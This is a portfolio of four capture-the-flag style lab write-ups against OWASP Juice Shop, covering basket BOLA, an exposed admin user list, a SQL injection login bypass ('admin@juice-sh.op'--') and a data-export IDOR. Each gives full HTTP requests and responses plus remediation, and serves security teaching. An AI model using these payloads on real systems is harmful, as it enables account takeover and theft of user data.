# OWASP Juice Shop - Security Audit Portfolio

This repository contains professional security writeups and proof-of-concept (PoC) documentation for vulnerabilities discovered in the OWASP Juice Shop application, demonstrating practical exploitation of web vulnerabilities.

---

# Lab Writeup 1: Unauthorized Access to Shopping Baskets

**Category:** Broken Object Level Authorization (BOLA)  
**Difficulty:** Practitioner  
**Date Completed:** 29/03/2026  
**Platform:** OWASP Juice Shop  
**Lab URL:** http://localhost:3000

---

## 1. Objective

Exploit a broken authorization mechanism in the shopping basket endpoint to access and view the private shopping basket contents of another user, demonstrating how improper access controls can lead to sensitive data exposure.

---

## 2. Vulnerability Overview

**Vulnerability Name:** Broken Object Level Authorization (BOLA)

**CWE Reference:** CWE-639: Authorization Bypass Through User-Controlled Key

**OWASP Category:** API1:2023 – Broken Object Level Authorization

**What is this vulnerability?**

BOLA occurs when an API endpoint doesn't properly verify if the authenticated user has permission to access a specific resource. In this case, the `/rest/basket/<id>` endpoint accepts a valid JWT token but fails to verify if that token's owner is the actual owner of the basket ID being requested. This means if I manipulate the `id` parameter in the URL, I can view other users' items just by iterating through sequential numbers.

---

## 3. Reconnaissance & Discovery

When I first started exploring the Juice Shop application, I took a methodical approach to understand its cart mechanisms:

**Initial Exploration:**
- Registered two accounts: an "Attacker" (`attacker@juice-sh.op`) and a "Victim" (`victim@juice-sh.op`).
- Added an item to the basket using the Attacker account.
- Monitored traffic in Burp Suite to observe how the application fetches basket details during checkout.

**Endpoint Discovery:**
- Found the basket retrieval endpoint: `GET /rest/basket/2`
- Observed that it uses Bearer token authentication in the Authorization header.
- Noticed that the basket ID (`2`) is exposed directly in the URL path.

**The "Aha!" Moment:**
While testing as the attacker, I noticed the URL structure `GET /rest/basket/<id>`. I wondered: *What if I just change the ID from 2 to 1?* Since the application seemed to trust the token without correlating it to the requested resource ID, this presented a classic BOLA attack surface. 

**Tool(s) Used:** Burp Suite Community Edition, Firefox Browser

---

## 4. Exploitation Steps

### Step 1: Intercept the Baseline Request

I logged into my attacker account and accessed my shopping basket. My assigned basket ID was `2`. I captured this traffic using Burp Suite's Proxy.

### Step 2: Modify the Target Resource ID

I sent the request to Burp Repeater. I modified the basket ID in the URL path from `2` (my basket) to `1` (the victim's basket) while keeping my attacker authentication token.

**Modified Request (Attacker's Token, Victim's Resource ID):**
```http
GET /rest/basket/1 HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tl...
Accept-Language: en-US,en;q=0.9
Connection: close
```

### Step 3: Forward the Request and Observe Response

I forwarded the modified request and observed the response from the server:

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 425
Connection: close

{
  "status": "success",
  "data": {
    "id": 1,
    "UserId": 1,
    "Products": [
      {
        "id": 1,
        "name": "Apple Juice (1000ml)",
        "description": "The all-time classic.",
        "price": 1.99,
        "BasketItem": {
          "id": 1,
          "BasketId": 1,
          "ProductId": 1,
          "quantity": 2
        }
      }
    ]
  }
}
```

**Success!** The server returned a `200 OK` exposing JSON data detailing the items inside Basket #1, belonging to another user.

---

## 5. Root Cause Analysis

The vulnerability exists because the application performs user authentication but fails to enforce resource-level authorization.

**What the API Does:**
1. ✅ Validates that the JWT token is legitimate and the session is active.
2. ✅ Confirms the user is authenticated.
3. ❌ **FAILS** to check if the authenticated user's ID matches the `userId` linked to the requested `BasketId` in the database.

**What the API Should Do:**
The API controller must inherently validate the request against database ownership records:
```javascript
// Pseudocode - What's Missing
const basketIdToFetch = req.params.id;
const authenticatedUserId = req.user.id; 

const basket = await Basket.findOne({ where: { id: basketIdToFetch } });

if (basket.UserId !== authenticatedUserId) {
    return res.status(403).json("Unauthorized: You do not own this basket");
}
```

---

## 6. Impact

- [x] Privilege Escalation (horizontal)
- [x] Data Exfiltration (indirect)
- [x] Privacy Violation

**Severity:** High

**Justification:** By automating the attack using Burp Intruder to iterate from basket ID 1 to 1000, an attacker can extract the purchase intent, behavioral data, and potentially sensitive product orders of every registered user. This is a severe breach of confidentiality.

---

## 7. Remediation

Here is how developers should fix this vulnerability:

1. **Implement Resource Ownership Verification:** Ensure that endpoints referencing an ID strictly verify that the logged-in user is the legitimate owner of that database record.
2. **Implicit Linking:** Do not accept the `basketId` from the client URL. Instead, infer the basket ID automatically on the backend using the user's validated JWT token.
3. **Use GUIDs/UUIDs:** Instead of predictable, sequential integers (e.g., `1`, `2`), use cryptographically secure random UUIDs for resource identifiers to mitigate ID enumeration attacks.

---

## 8. Key Takeaways / What I Learned

- **Authentication ≠ Authorization:** Validating a session is only half the battle. We must always validate if that session has rights to the *specific data* requested.
- **Predictable IDs are Dangerous:** Auto-incrementing numbers make enumeration trivial for attackers. Use unguessable UUIDs whenever possible.
- **Server Confidence:** Never rely on the client to honestly state what it should access or own.

<br><br>

---

# Lab Writeup 2: Unauthorized Administrative User List Exposure

**Category:** Broken Function Level Authorization (BFLA)  
**Difficulty:** Beginner  
**Date Completed:** 29/03/2026  
**Platform:** OWASP Juice Shop  
**Lab URL:** http://localhost:3000

---

## 1. Objective

Exploit a broken function-level authorization mechanism to bypass Role-Based Access Controls (RBAC) and successfully query the restricted administrative user directory as a standard customer. 

---

## 2. Vulnerability Overview

**Vulnerability Name:** Broken Function Level Authorization (BFLA)

**CWE Reference:** CWE-285: Improper Authorization

**OWASP Category:** API5:2023 – Broken Function Level Authorization

**What is this vulnerability?**

BFLA occurs when an application restricts access to UI elements (like hiding the Admin Panel from regular users) but fails to implement robust permission checks at the API/server backend. In this case, the `/api/Users` endpoint freely returns the complete user database array to any client providing a valid JWT, regardless of whether that JWT belongs to an Administrator or a Customer.

---

## 3. Reconnaissance & Discovery

During the enumeration phase, I focused on identifying backend API surfaces that might map to administrative functionalities:

**Endpoint Discovery:**
- Navigated through the bundled JavaScript files for hidden paths.
- Located references to `/Administration` and `/api/Users`.
- Discovered that the UI actively prevents regular users from rendering the Admin component. 

**The "Aha!" Moment:**
I knew from experience that UI hiding is not a security measure. I wondered: *Will the backend API enforce the same rules the frontend UI does?* I decided to directly call the API endpoint using my low-privileged token.

**Tool(s) Used:** Burp Suite Community Edition, DevTools

---

## 4. Exploitation Steps

### Step 1: Login as Standard Customer

I registered and logged in as a normal, unprivileged user to obtain a standard Bearer token.

### Step 2: Formulate the API Request

Without relying on the UI, I crafted a custom `GET` request to the target administrative API endpoint directly in Burp Repeater, attaching my low-privileged token.

**Request:**
```http
GET /api/Users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json, text/plain, */*
Authorization: Bearer [STANDARD_CUSTOMER_TOKEN]
Accept-Language: en-US,en;q=0.9
Connection: close
```

### Step 3: Forward the Request and Analyze

I forwarded the request to the server:

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 1045
Connection: close

{
  "status": "success",
  "data": [
    {
      "id": 1,
      "email": "admin@juice-sh.op",
      "password": "hashed_password_string_here",
      "role": "admin",
      "deluxeToken": "",
      "lastLoginIp": "127.0.0.1",
      "profileImage": "default.svg"
    },
    {
      "id": 2,
      "email": "customer@juice-sh.op",
      "password": "hashed_password_string_here",
      "role": "customer",
      "deluxeToken": "",
      "lastLoginIp": "127.0.0.1",
      "profileImage": "default.svg"
    }
  ]
}
```

**Success!** The backend returned a `200 OK` with the complete database registry of every user, including their emails, hashed passwords, and assigned privilege roles.

---

## 5. Root Cause Analysis

The flaw originates from the backend service lacking middleware verification for Role-Based Access Control (RBAC).

**What the API Does:**
1. ✅ Checks for a valid token (Authentication).
2. ❌ **FAILS** to verify if the token contains administrative claims before executing the database query.

**What the API Should Do:**
The route should be guarded by an authorization middleware that validates user roles:
```javascript
// Pseudocode - What's Missing
function isAdminMiddleware(req, res, next) {
    if (req.user.role !== 'admin') {
        return res.status(403).json("Forbidden: Admin access required");
    }
    next();
}

app.get('/api/Users', isAuthenticated, isAdminMiddleware, userController.getAll);
```

---

## 6. Impact

- [x] Privilege Escalation (vertical)
- [x] Mass PII Data Leakage

**Severity:** High

**Justification:** Access to the user database exposes sensitive emails and hashed passwords. An attacker can use this data to perform offline password-cracking attacks against the administrator's hash, leading to full system compromise. 

---

## 7. Remediation

1. **Backend Role Validation:** Implement a strict RBAC (Role-Based Access Control) matrix. Enforce role-validation middleware on all administrative endpoints.
2. **Deny-by-Default:** Ensure API endpoints deny access by default unless explicitly configured with specific required roles.
3. **Data Minimization:** Even when accessed legitimately by an admin, endpoints should automatically strip out unnecessary sensitive fields like hashed passwords before serving JSON payloads to the frontend.

---

## 8. Key Takeaways / What I Learned

- **UI Hiding is NOT Security:** Just because a link or a button isn't visible on the screen doesn't mean an attacker cannot interact with the underlying API. Security must be enforced on the server side.
- **Vertical Escalation is Fatal:** BFLA heavily impacts the core security model of administrative functions. 

<br><br>

---

# Lab Writeup 3: Administrator Account Takeover via SQL Injection

**Category:** Injection (SQLi)  
**Difficulty:** Beginner  
**Date Completed:** 29/03/2026  
**Platform:** OWASP Juice Shop  
**Lab URL:** http://localhost:3000

---

## 1. Objective

Successfully execute an Authentication Bypass attack using SQL Injection on the login portal to force the database to authenticate as the Administrator without requiring a valid password.

---

## 2. Vulnerability Overview

**Vulnerability Name:** SQL Injection (Authentication Bypass)

**CWE Reference:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

**OWASP Category:** A03:2021 – Injection

**What is this vulnerability?**

SQL Injection occurs when user-supplied input is directly concatenated into a backend SQL database query without sanitization or parameterization. This allows an attacker to manipulate the structure of the executed query. By injecting specific characters (like a single quote `'`), an attacker can terminate the intended query string and inject logical operators to arbitrarily evaluate the authentication check to "TRUE". 

---

## 3. Reconnaissance & Discovery

During initial testing of authentication mechanisms:

**Initial Exploration:**
- Attempted to submit standard single quotes (`'`) into the email field of the login portal to observe the application's response to unexpected metacharacters.
- Monitored the HTTP response codes and error messages.

**The "Aha!" Moment:**
When passing `'` into the login field, the application unexpectedly behaved strangely, returning a 500 Internal Server Error, strongly indicating that the backend database choked on the syntax. The login page was susceptible to Boolean/Error-based SQL testing logic.

**Tool(s) Used:** Burp Suite Community Edition

---

## 4. Exploitation Steps

### Step 1: Craft the Payload

To log in as the Administrator, I needed a payload that would close the email string, comment out the remainder of the password verification query, and return the first matched database row (which is typically the Admin).
- **Target Email:** `admin@juice-sh.op`
- **Injection:** `'--` (Closes the string and adds a SQL comment)
- **Final Payload:** `admin@juice-sh.op'--`

### Step 2: Send the Request in Burp Suite

Logged into Burp Suite, navigated to the login endpoint, and submitted the crafted payload inside the JSON body. 

**Request:**
```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Connection: close

{
  "email": "admin@juice-sh.op'--",
  "password": "arbitrary_random_text_here"
}
```

### Step 3: Analyze the Server Logic and Response

The backend concatenated the strings into an unsecured SQL query that looked like this:
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = 'arbitrary_random_text_here'
```
Because `--` comments out the rest of the query, the `AND password = ...` clause was completely ignored.

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 412
Connection: close

{
  "authentication": {
    "umail": "admin@juice-sh.op",
    "role": "admin",
    "id": 1
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIj..."
}
```

**Success!** The application instantly authenticated me as the Administrator and provided a fully-privileged JWT token.

---

## 5. Root Cause Analysis

The root cause of this vulnerability involves the failure to use modern secure coding practices when communicating with databases.

**What the API Does:**
1. ❌ **FAILS** to parameterize inputs.
2. Formats a raw, unescaped dynamic string and feeds it directly into the SQL engine.

**What the API Should Do:**
The query should be executed using parameterized statements (Prepared Statements), which treat user input strictly as data and prevent it from being parsed as executable code logic:
```javascript
// Pseudocode - The Fix
const sql = 'SELECT * FROM Users WHERE email = ? AND password = ?';
db.execute(sql, [req.body.email, hashed_password]); 
```

---

## 6. Impact

- [x] Complete Account Takeover
- [x] Administrative System Compromise

**Severity:** Critical

**Justification:** Bypassing authentication to compromise the highest privilege account (Administrator) immediately relinquishes total control of the system to the attacker. They gain full read/write access over the database and configuration logic.

---

## 7. Remediation

1. **Use Prepared Statements:** Defend against SQL Injection inherently by migrating to Prepared Statements / Parameterized Queries.
2. **Utilize ORMs:** Adopt robust Object-Relational Mapping (ORM) frameworks like Sequelize or Prisma, which handle parametrization gracefully by default.
3. **Input Sanitization:** As a secondary defense-in-depth layout, reject input containing illegal character sequences at the WAF or Middleware layer.

---

## 8. Key Takeaways / What I Learned

- **Never Trust User Data:** Any input spanning from HTTP headers to JSON body fields must be treated as hostile code.
- **SQLi Remains Relevant:** Even with modern frameworks, inline queries can slip through causing devastating bypass scenarios.

<br><br>

---

# Lab Writeup 4: Unauthorized Sensitive Data Exfiltration via BFLA

**Category:** Broken Function Level Authorization (BFLA)  
**Difficulty:** Practitioner  
**Date Completed:** 29/03/2026  
**Platform:** OWASP Juice Shop  
**Lab URL:** http://localhost:3000

---

## 1. Objective

Exploit a broken authorization misconfiguration within the data-export endpoint to trigger the packaging and external transfer of the Administrator's sensitive account data using an unauthorized user's token.

---

## 2. Vulnerability Overview

**Vulnerability Name:** Broken Function Level Authorization (BFLA) / Insecure Direct Object Reference (IDOR)

**CWE Reference:** CWE-639: Authorization Bypass Through User-Controlled Key

**What is this vulnerability?**

The application provides a GDPR-compliant `/rest/user/data-export` feature for users to request copies of their private data. However, the endpoint receives the target user email through the client's request body (`{"email": "..."}`) and blindly trusts it, failing to check if the provided email matches the authenticated user token making the request. 

---

## 3. Reconnaissance & Discovery

**Initial Exploration:**
- Logged in as a standard attacker account and initiated a legitimate data export request through the Privacy dashboard.
- Intercepted the outgoing request to understand the payload format.

**The "Aha!" Moment:**
I noticed that the API request includes a JSON body with an explicit `"email"` variable pointing to my own account. I immediately knew that if the server logic relies on this parameter instead of the JWT context to compile the data, I could manipulate it to target another user. 

**Tool(s) Used:** Burp Suite Community Edition

---

## 4. Exploitation Steps

### Step 1: Capture the Feature Workflow

Intercepted the legitimate export POST request sent from my attacker account in Burp Suite Proxy.

### Step 2: Modify the Target Email 

Sent the request to Repeater and modified the `"email"` string in the JSON payload to target the administrator (`admin@juice-sh.op`) instead of my own email, while keeping my own attacker JWT token in the Authorization header.

**Modified Request:**
```http
POST /rest/user/data-export HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Authorization: Bearer [ATTACKER_JWT_TOKEN]
Connection: close

{
  "email": "admin@juice-sh.op"
}
```

### Step 3: Forward the Request and Analyze

Forwarded the modified request through Burp Suite.

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 68
Connection: close

{
  "status": "success",
  "message": "Data export successfully completed",
  "url": "/ftp/admin_data_export.zip"
}
```

**Success!** The server accepted my request, packaged the requested user's sensitive information, and even provided me the FTP link to download the zipped data archive.

---

## 5. Root Cause Analysis

The application fails because it derives the system context from client-supplied variables rather than the verified, tamper-proof state maintained on the backend. 

**What the API Does:**
1. ✅ Checks that a token exists. 
2. ❌ **FAILS** to correlate the parameter within the request body against the authenticated user.
3. Blindly trusts that the requested parameter is valid.

**What the API Should Do:**
The server must discard the email parameter supplied by the client completely. It should independently look up the user's email using the safe user ID extracted within the verified JWT token:
```javascript
// Pseudocode - The Fix
const verifiedUserId = req.user.id; 

const user = await User.findByPk(verifiedUserId);
const targetEmailToExport = user.email; // Extracted securely on backend

exportDataWorkflow(targetEmailToExport);
```

---

## 6. Impact

- [x] Unauthorized Data Exfiltration
- [x] Identity Theft
- [x] Regulatory/Compliance Violation (GDPR)

**Severity:** High

**Justification:** Utilizing this mechanism, attackers can effortlessly siphon private data out of the system. In real-world platforms, this data typically includes social security numbers, banking details, behavioral analytics, and history, posing an immense privacy impact.

---

## 7. Remediation

1. **Context Derivation:** Never extract critical targeting references (`email`, `user_id`, `account_num`) from the client payload when performing actions tied to sessions. Always derive the user target from the decoded, signed JSON Web Token properties.
2. **Access Control Matrices:** If administrative proxies are allowed to export data for *other* users, implement robust RBAC to ensure the requester explicitly holds an "Admin" or "Support" role before accepting user-supplied parameters. 

---

## 8. Key Takeaways / What I Learned

- **Client-Side Parameters Cannot Be Trusted:** This BFLA was entirely reliant on the development flaw of trusting that the client's HTTP body request was sent in good faith.
- **Privacy Features are Double-Edged Swords:** Endpoints designed specifically for GDPR/privacy compliance (like exporting data) often become prime targets for attackers if authorization structures are poorly engineered.

<br><br>
